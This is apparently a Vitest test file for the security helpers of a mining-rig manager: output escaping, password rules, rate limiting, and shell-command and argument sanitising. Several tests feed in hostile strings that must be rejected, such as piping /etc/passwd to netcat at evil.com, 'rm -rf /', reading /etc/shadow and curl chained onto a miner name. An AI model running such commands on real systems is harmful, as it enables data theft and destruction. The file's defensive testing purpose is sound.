import { describe, it, expect } from 'vitest';
import {
  sanitizeOutput,
  validateWSMessage,
  createSafeWSMessage,
  validatePassword,
  validateEmail,
  checkRateLimit,
  recordFailedLogin,
  isAccountLocked,
  generateSecureToken,
  generateApiKey,
  sanitizeString,
  validateHostname,
  validateIPAddress,
  sanitizeCommand,
  isCommandAllowed,
  escapeShellArg,
  validateMinerName,
  validatePoolUrl,
  validateWalletAddress,
  validateExtraArgs,
  validateOCValue,
  validateNumericRange,
} from '../utils/security.ts';

describe('Security Utils', () => {
  describe('sanitizeOutput', () => {
    it('should escape HTML special characters in strings', () => {
      const input = '<script>alert("xss")</script>';
      const result = sanitizeOutput(input);
      expect(result).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
    });

    it('should sanitize strings in objects', () => {
      const input = { name: '<b>test</b>' };
      const result = sanitizeOutput(input) as typeof input;
      expect(result.name).toBe('&lt;b&gt;test&lt;&#x2F;b&gt;');
    });

    it('should handle arrays', () => {
      const input = ['<script>', 'normal'];
      const result = sanitizeOutput(input) as string[];
      expect(result[0]).toBe('&lt;script&gt;');
      expect(result[1]).toBe('normal');
    });

    it('should handle nested objects', () => {
      const input = {
        user: {
          name: '<script>evil</script>',
        },
      };
      const result = sanitizeOutput(input) as typeof input;
      expect(result.user.name).toContain('&lt;script&gt;');
    });

    it('should handle null and undefined', () => {
      expect(sanitizeOutput(null)).toBeNull();
      expect(sanitizeOutput(undefined)).toBeUndefined();
    });

    it('should handle primitive types', () => {
      expect(sanitizeOutput(123)).toBe(123);
      expect(sanitizeOutput(true)).toBe(true);
    });

    it('should preserve special fields like id and timestamp', () => {
      const input = { id: '123', timestamp: '2026-01-01' };
      const result = sanitizeOutput(input) as typeof input;
      expect(result.id).toBe('123');
      expect(result.timestamp).toBe('2026-01-01');
    });
  });

  describe('validateWSMessage', () => {
    it('should validate valid JSON messages', () => {
      const result = validateWSMessage('{"type":"ping"}');
      expect(result.valid).toBe(true);
      expect(result.message).toEqual({ type: 'ping' });
    });

    it('should reject invalid JSON', () => {
      const result = validateWSMessage('not json');
      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should reject non-object messages', () => {
      const result = validateWSMessage('"just a string"');
      expect(result.valid).toBe(false);
      expect(result.error).toBe('Message must be an object');
    });

    it('should reject messages without type field', () => {
      const result = validateWSMessage('{"data": "test"}');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('type');
    });
  });

  describe('createSafeWSMessage', () => {
    it('should create valid JSON message', () => {
      const message = createSafeWSMessage('test', { foo: 'bar' });
      const parsed = JSON.parse(message);
      expect(parsed.type).toBe('test');
      expect(parsed.data.foo).toBe('bar');
    });

    it('should sanitize data in message', () => {
      const message = createSafeWSMessage('test', { html: '<script>' });
      const parsed = JSON.parse(message);
      expect(parsed.data.html).toBe('&lt;script&gt;');
    });

    it('should work without data', () => {
      const message = createSafeWSMessage('ping');
      const parsed = JSON.parse(message);
      expect(parsed.type).toBe('ping');
      expect(parsed.data).toBeUndefined();
    });
  });

  describe('validatePassword', () => {
    it('should accept strong passwords', () => {
      const result = validatePassword('SecurePass123!@#');
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject short passwords', () => {
      const result = validatePassword('Short1!');
      expect(result.valid).toBe(false);
      expect(result.errors.join(' ')).toContain('12 characters');
    });

    it('should reject passwords without uppercase', () => {
      const result = validatePassword('lowercase123!@#');
      expect(result.valid).toBe(false);
      expect(result.errors.join(' ')).toContain('uppercase');
    });

    it('should reject passwords without lowercase', () => {
      const result = validatePassword('UPPERCASE123!@#');
      expect(result.valid).toBe(false);
      expect(result.errors.join(' ')).toContain('lowercase');
    });

    it('should reject passwords without numbers', () => {
      const result = validatePassword('NoNumbersHere!@#');
      expect(result.valid).toBe(false);
      expect(result.errors.join(' ')).toContain('number');
    });

    it('should reject passwords without special characters', () => {
      const result = validatePassword('NoSpecial12345Ab');
      expect(result.valid).toBe(false);
      expect(result.errors.join(' ')).toContain('special');
    });
  });

  describe('validateEmail', () => {
    it('should accept valid emails', () => {
      expect(validateEmail('user@example.com')).toBe(true);
      expect(validateEmail('test.user@domain.co.uk')).toBe(true);
      expect(validateEmail('user+tag@example.org')).toBe(true);
    });

    it('should reject invalid emails', () => {
      expect(validateEmail('notanemail')).toBe(false);
      expect(validateEmail('missing@domain')).toBe(false);
      expect(validateEmail('@nodomain.com')).toBe(false);
    });
  });

  describe('validateHostname', () => {
    it('should accept valid hostnames', () => {
      expect(validateHostname('example.com')).toBe(true);
      expect(validateHostname('sub.example.com')).toBe(true);
      expect(validateHostname('rig-01')).toBe(true);
    });

    it('should reject invalid hostnames', () => {
      expect(validateHostname('-invalid')).toBe(false);
      expect(validateHostname('has spaces')).toBe(false);
    });
  });

  describe('validateIPAddress', () => {
    it('should accept valid IPv4 addresses', () => {
      expect(validateIPAddress('192.168.1.1')).toBe(true);
      expect(validateIPAddress('10.0.0.1')).toBe(true);
      expect(validateIPAddress('0.0.0.0')).toBe(true);
    });

    it('should reject invalid IPv4 addresses', () => {
      expect(validateIPAddress('256.256.256.256')).toBe(false);
      expect(validateIPAddress('not.an.ip')).toBe(false);
    });
  });

  describe('Rate Limiting', () => {
    it('should allow requests under limit', () => {
      const key = `test-${Date.now()}-${Math.random()}`;
      const result = checkRateLimit(key, 10, 60000);
      expect(result.allowed).toBe(true);
      expect(result.remaining).toBe(9);
    });

    it('should block requests over limit', () => {
      const key = `test-block-${Date.now()}-${Math.random()}`;
      // Exhaust the limit
      for (let i = 0; i < 5; i++) {
        checkRateLimit(key, 5, 60000);
      }
      const result = checkRateLimit(key, 5, 60000);
      expect(result.allowed).toBe(false);
      expect(result.remaining).toBe(0);
    });
  });

  describe('Account Lockout', () => {
    it('should lock account after max failed attempts', () => {
      const key = `lockout-test-${Date.now()}-${Math.random()}`;
      
      // Record 5 failed attempts
      for (let i = 0; i < 5; i++) {
        recordFailedLogin(key);
      }
      
      const lockStatus = isAccountLocked(key);
      expect(lockStatus.locked).toBe(true);
    });

    it('should not lock account under max attempts', () => {
      const key = `no-lockout-${Date.now()}-${Math.random()}`;
      
      // Record 4 failed attempts (under threshold)
      for (let i = 0; i < 4; i++) {
        recordFailedLogin(key);
      }
      
      const lockStatus = isAccountLocked(key);
      expect(lockStatus.locked).toBe(false);
    });

    it('should return remaining attempts', () => {
      const key = `attempts-${Date.now()}-${Math.random()}`;
      const result = recordFailedLogin(key);
      expect(result.attemptsRemaining).toBe(4); // 5 max - 1 attempt
    });
  });

  describe('Token Generation', () => {
    it('should generate secure tokens of specified length', () => {
      const token = generateSecureToken(32);
      expect(token).toBeDefined();
      // 32 bytes in base64url = ceil(32 * 4/3) = 43 characters
      expect(token.length).toBe(43);
    });

    it('should generate unique tokens', () => {
      const token1 = generateSecureToken();
      const token2 = generateSecureToken();
      expect(token1).not.toBe(token2);
    });

    it('should generate API keys with prefix', () => {
      const apiKey = generateApiKey();
      expect(apiKey.startsWith('blx_')).toBe(true);
    });
  });

  describe('sanitizeString', () => {
    it('should trim and limit string length', () => {
      const input = '  test  ';
      expect(sanitizeString(input)).toBe('test');
    });

    it('should remove HTML tags', () => {
      const input = '<script>alert(1)</script>test';
      const result = sanitizeString(input);
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    it('should respect max length', () => {
      const input = 'a'.repeat(300);
      const result = sanitizeString(input, 100);
      expect(result.length).toBe(100);
    });
  });

  // ============================================
  // MINING SECURITY VALIDATOR TESTS
  // ============================================

  describe('sanitizeCommand', () => {
    it('should accept clean commands', () => {
      expect(sanitizeCommand('hostname')).toBe('hostname');
      expect(sanitizeCommand('nvidia-smi')).toBe('nvidia-smi');
      expect(sanitizeCommand('ps aux')).toBe('ps aux');
    });

    it('should trim whitespace', () => {
      expect(sanitizeCommand('  hostname  ')).toBe('hostname');
    });

    it('should reject empty commands', () => {
      expect(() => sanitizeCommand('')).toThrow('Empty command');
      expect(() => sanitizeCommand('   ')).toThrow('Empty command');
    });

    it('should reject semicolon injection', () => {
      expect(() => sanitizeCommand('hostname; rm -rf /')).toThrow('disallowed characters');
    });

    it('should reject pipe injection', () => {
      expect(() => sanitizeCommand('cat /etc/passwd | nc evil.com 1234')).toThrow('disallowed characters');
    });

    it('should reject backtick injection', () => {
      expect(() => sanitizeCommand('echo `whoami`')).toThrow('disallowed characters');
    });

    it('should reject $() subshell injection', () => {
      expect(() => sanitizeCommand('echo $(cat /etc/shadow)')).toThrow('disallowed characters');
    });

    it('should reject ampersand chaining', () => {
      expect(() => sanitizeCommand('cmd1 && cmd2')).toThrow('disallowed characters');
    });

    it('should reject redirection', () => {
      expect(() => sanitizeCommand('echo pwned > /etc/crontab')).toThrow('disallowed characters');
    });

    it('should reject single and double quotes', () => {
      expect(() => sanitizeCommand("echo 'hello'")).toThrow('disallowed characters');
      expect(() => sanitizeCommand('echo "hello"')).toThrow('disallowed characters');
    });

    it('should reject curly brace expansion', () => {
      expect(() => sanitizeCommand('echo {a,b,c}')).toThrow('disallowed characters');
    });

    it('should reject backslash escape sequences', () => {
      expect(() => sanitizeCommand('echo \\n')).toThrow('disallowed characters');
    });

    it('should consistently detect dangerous chars on repeated calls (no stateful regex bug)', () => {
      // This verifies the global flag fix: with /g, .test() alternates true/false
      for (let i = 0; i < 10; i++) {
        expect(() => sanitizeCommand('bad;command')).toThrow('disallowed characters');
      }
    });
  });

  describe('isCommandAllowed', () => {
    it('should allow whitelisted base commands', () => {
      expect(isCommandAllowed('hostname')).toBe(true);
      expect(isCommandAllowed('nvidia-smi')).toBe(true);
      expect(isCommandAllowed('uname')).toBe(true);
      expect(isCommandAllowed('uptime')).toBe(true);
    });

    it('should allow whitelisted commands with arguments', () => {
      expect(isCommandAllowed('ps aux')).toBe(true);
      expect(isCommandAllowed('hostname -I')).toBe(true);
    });

    it('should allow whitelisted compound commands', () => {
      expect(isCommandAllowed('cat /etc/os-release')).toBe(true);
      expect(isCommandAllowed('cat /proc/cpuinfo')).toBe(true);
    });

    it('should allow miner commands', () => {
      expect(isCommandAllowed('t-rex')).toBe(true);
      expect(isCommandAllowed('lolminer')).toBe(true);
      expect(isCommandAllowed('xmrig')).toBe(true);
    });

    it('should reject unknown commands', () => {
      expect(isCommandAllowed('wget')).toBe(false);
      expect(isCommandAllowed('curl')).toBe(false);
      expect(isCommandAllowed('rm')).toBe(false);
      expect(isCommandAllowed('dd')).toBe(false);
    });

    it('should extract base command from full path', () => {
      expect(isCommandAllowed('/usr/bin/nvidia-smi')).toBe(true);
      expect(isCommandAllowed('/opt/miners/t-rex')).toBe(true);
    });
  });

  describe('escapeShellArg', () => {
    it('should wrap argument in single quotes', () => {
      expect(escapeShellArg('hello')).toBe("'hello'");
    });

    it('should escape single quotes within the argument', () => {
      expect(escapeShellArg("it's")).toBe("'it'\\''s'");
    });

    it('should handle empty string', () => {
      expect(escapeShellArg('')).toBe("''");
    });

    it('should neutralize shell metacharacters', () => {
      const dangerous = '; rm -rf /';
      const escaped = escapeShellArg(dangerous);
      expect(escaped).toBe("'; rm -rf /'");
      // Inside single quotes, semicolons and spaces are literal
    });

    it('should handle dollar signs and backticks safely', () => {
      expect(escapeShellArg('$(whoami)')).toBe("'$(whoami)'");
      expect(escapeShellArg('`id`')).toBe("'`id`'");
    });

    it('should handle multiple single quotes', () => {
      expect(escapeShellArg("a'b'c")).toBe("'a'\\''b'\\''c'");
    });
  });

  describe('validateMinerName', () => {
    it('should accept all valid miners', () => {
      const validMiners = ['t-rex', 'lolminer', 'gminer', 'nbminer', 'teamredminer', 'xmrig', 'bzminer'];
      for (const miner of validMiners) {
        expect(() => validateMinerName(miner)).not.toThrow();
      }
    });

    it('should be case-insensitive', () => {
      expect(() => validateMinerName('T-Rex')).not.toThrow();
      expect(() => validateMinerName('XMRIG')).not.toThrow();
    });

    it('should reject unknown miners', () => {
      expect(() => validateMinerName('malware')).toThrow('Invalid miner');
      expect(() => validateMinerName('rm')).toThrow('Invalid miner');
    });

    it('should reject injection attempts in miner name', () => {
      expect(() => validateMinerName('t-rex; rm -rf /')).toThrow('Invalid miner');
      expect(() => validateMinerName('xmrig && curl evil.com')).toThrow('Invalid miner');
    });

    it('should reject empty string', () => {
      expect(() => validateMinerName('')).toThrow('Invalid miner');
    });
  });

  describe('validatePoolUrl', () => {
    it('should accept valid stratum URLs', () => {
      expect(() => validatePoolUrl('stratum+tcp://pool.example.com:3333')).not.toThrow();
      expect(() => validatePoolUrl('stratum+ssl://pool.example.com:4444')).not.toThrow();
      expect(() => validatePoolUrl('stratum2+tcp://pool.example.com:5555')).not.toThrow();
      expect(() => validatePoolUrl('stratum2+ssl://pool.example.com:6666')).not.toThrow();
    });

    it('should accept HTTP/HTTPS pool URLs', () => {
      expect(() => validatePoolUrl('https://pool.example.com')).not.toThrow();
      expect(() => validatePoolUrl('http://pool.example.com:8080')).not.toThrow();
    });

    it('should accept URLs with paths', () => {
      expect(() => validatePoolUrl('stratum+tcp://pool.example.com:3333/worker1')).not.toThrow();
    });

    it('should reject invalid protocols', () => {
      expect(() => validatePoolUrl('ftp://pool.example.com')).toThrow('Invalid pool URL');
      expect(() => validatePoolUrl('file:///etc/passwd')).toThrow('Invalid pool URL');
    });

    it('should reject URLs without protocol', () => {
      expect(() => validatePoolUrl('pool.example.com:3333')).toThrow('Invalid pool URL');
    });

    it('should reject injection in URLs', () => {
      expect(() => validatePoolUrl('stratum+tcp://pool.com; rm -rf /')).toThrow('Invalid pool URL');
      expect(() => validatePoolUrl('stratum+tcp://pool.com`whoami`')).toThrow('Invalid pool URL');
    });

    it('should reject empty string', () => {
      expect(() => validatePoolUrl('')).toThrow('Invalid pool URL');
    });
  });

  describe('validateWalletAddress', () => {
    it('should accept valid wallet addresses', () => {
      // ETH-like
      expect(() => validateWalletAddress('0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18')).not.toThrow();
      // BTC-like
      expect(() => validateWalletAddress('1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa')).not.toThrow();
      // With dots/underscores (worker names)
      expect(() => validateWalletAddress('wallet.worker_01')).not.toThrow();
    });

    it('should reject addresses with shell metacharacters', () => {
      expect(() => validateWalletAddress('wallet;rm -rf /')).toThrow('Invalid wallet address');
      expect(() => validateWalletAddress('wallet$(whoami)')).toThrow('Invalid wallet address');
      expect(() => validateWalletAddress('wallet`id`')).toThrow('Invalid wallet address');
    });

    it('should reject addresses that are too short', () => {
      expect(() => validateWalletAddress('short')).toThrow('Invalid wallet address');
    });

    it('should reject addresses that are too long', () => {
      expect(() => validateWalletAddress('a'.repeat(151))).toThrow('Invalid wallet address');
    });

    it('should accept addresses at boundary lengths', () => {
      expect(() => validateWalletAddress('a'.repeat(10))).not.toThrow();
      expect(() => validateWalletAddress('a'.repeat(150))).not.toThrow();
    });

    it('should reject empty string', () => {
      expect(() => validateWalletAddress('')).toThrow('Invalid wallet address');
    });

    it('should reject addresses with spaces', () => {
      expect(() => validateWalletAddress('wallet address here')).toThrow('Invalid wallet address');
    });
  });

  describe('validateExtraArgs', () => {
    it('should accept valid extra arguments', () => {
      expect(validateExtraArgs('--intensity=20')).toBe('--intensity=20');
      expect(validateExtraArgs('--dag-build-mode 1')).toBe('--dag-build-mode 1');
      expect(validateExtraArgs('--mt 2')).toBe('--mt 2');
    });

    it('should return empty string for empty/falsy input', () => {
      expect(validateExtraArgs('')).toBe('');
    });

    it('should trim whitespace', () => {
      expect(validateExtraArgs('  --intensity=20  ')).toBe('--intensity=20');
    });

    it('should reject semicolons', () => {
      expect(() => validateExtraArgs('--intensity=20; rm -rf /')).toThrow('invalid characters');
    });

    it('should reject backticks', () => {
      expect(() => validateExtraArgs('--worker=`whoami`')).toThrow('invalid characters');
    });

    it('should reject $() subshells', () => {
      expect(() => validateExtraArgs('--worker=$(id)')).toThrow('invalid characters');
    });

    it('should reject pipes', () => {
      expect(() => validateExtraArgs('--opt | nc evil.com 1234')).toThrow('invalid characters');
    });

    it('should reject quotes', () => {
      expect(() => validateExtraArgs("--opt='value'")).toThrow('invalid characters');
      expect(() => validateExtraArgs('--opt="value"')).toThrow('invalid characters');
    });

    it('should allow dots in arguments', () => {
      expect(validateExtraArgs('--version=1.0.5')).toBe('--version=1.0.5');
    });
  });

  describe('validateOCValue', () => {
    it('should accept valid NVIDIA power limit', () => {
      expect(() => validateOCValue('NVIDIA', 'powerLimit', 250)).not.toThrow();
    });

    it('should accept valid NVIDIA core offset', () => {
      expect(() => validateOCValue('NVIDIA', 'coreOffset', -100)).not.toThrow();
      expect(() => validateOCValue('NVIDIA', 'coreOffset', 200)).not.toThrow();
    });

    it('should accept valid NVIDIA memory offset', () => {
      expect(() => validateOCValue('NVIDIA', 'memOffset', 1000)).not.toThrow();
    });

    it('should accept valid NVIDIA fan speed', () => {
      expect(() => validateOCValue('NVIDIA', 'fanSpeed', 75)).not.toThrow();
    });

    it('should reject out-of-range NVIDIA power limit', () => {
      expect(() => validateOCValue('NVIDIA', 'powerLimit', 600)).toThrow();
      expect(() => validateOCValue('NVIDIA', 'powerLimit', 10)).toThrow();
    });

    it('should reject out-of-range NVIDIA core offset', () => {
      expect(() => validateOCValue('NVIDIA', 'coreOffset', -600)).toThrow();
      expect(() => validateOCValue('NVIDIA', 'coreOffset', 600)).toThrow();
    });

    it('should reject out-of-range NVIDIA memory offset', () => {
      expect(() => validateOCValue('NVIDIA', 'memOffset', -2500)).toThrow();
      expect(() => validateOCValue('NVIDIA', 'memOffset', 4000)).toThrow();
    });

    it('should accept valid AMD values', () => {
      expect(() => validateOCValue('AMD', 'powerLimit', 200)).not.toThrow();
      expect(() => validateOCValue('AMD', 'coreOffset', 0)).not.toThrow();
      expect(() => validateOCValue('AMD', 'fanSpeed', 50)).not.toThrow();
    });

    it('should reject out-of-range AMD power limit', () => {
      expect(() => validateOCValue('AMD', 'powerLimit', 500)).toThrow();
      expect(() => validateOCValue('AMD', 'powerLimit', 10)).toThrow();
    });

    it('should skip validation for null values', () => {
      expect(() => validateOCValue('NVIDIA', 'powerLimit', null)).not.toThrow();
    });

    it('should reject unknown OC settings', () => {
      expect(() => validateOCValue('NVIDIA', 'unknownSetting', 100)).toThrow('Unknown OC setting');
    });

    it('should accept boundary values', () => {
      // NVIDIA power limit boundaries: 50-500
      expect(() => validateOCValue('NVIDIA', 'powerLimit', 50)).not.toThrow();
      expect(() => validateOCValue('NVIDIA', 'powerLimit', 500)).not.toThrow();
      // NVIDIA fan speed boundaries: 0-100
      expect(() => validateOCValue('NVIDIA', 'fanSpeed', 0)).not.toThrow();
      expect(() => validateOCValue('NVIDIA', 'fanSpeed', 100)).not.toThrow();
    });
  });

  describe('validateNumericRange', () => {
    it('should accept values within range', () => {
      expect(() => validateNumericRange(50, 0, 100, 'test')).not.toThrow();
    });

    it('should accept boundary values', () => {
      expect(() => validateNumericRange(0, 0, 100, 'test')).not.toThrow();
      expect(() => validateNumericRange(100, 0, 100, 'test')).not.toThrow();
    });

    it('should reject values below minimum', () => {
      expect(() => validateNumericRange(-1, 0, 100, 'test')).toThrow('must be between');
    });

    it('should reject values above maximum', () => {
      expect(() => validateNumericRange(101, 0, 100, 'test')).toThrow('must be between');
    });

    it('should reject NaN', () => {
      expect(() => validateNumericRange(NaN, 0, 100, 'test')).toThrow('must be a valid number');
    });

    it('should include the field name in error messages', () => {
      expect(() => validateNumericRange(999, 0, 100, 'fanSpeed')).toThrow('fanSpeed');
    });
  });
});
